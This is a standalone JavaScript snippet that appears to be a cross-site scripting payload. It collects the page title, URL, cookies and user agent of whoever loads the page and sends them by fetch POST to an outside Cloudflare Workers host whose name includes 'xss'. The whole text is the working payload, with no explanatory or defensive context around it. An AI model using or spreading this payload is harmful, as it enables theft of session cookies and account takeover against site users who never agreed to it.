(function(){
  var workerUrl = "https://xss.agunggsec.workers.dev/";

  var payloadData = {
    title: document.title || "No Title",
    url: location.href,
    cookie: document.cookie || "None or HttpOnly",
    ua: navigator.userAgent
  };

  fetch(workerUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payloadData)
  }).catch(function(err){ console.error(err); });
})();
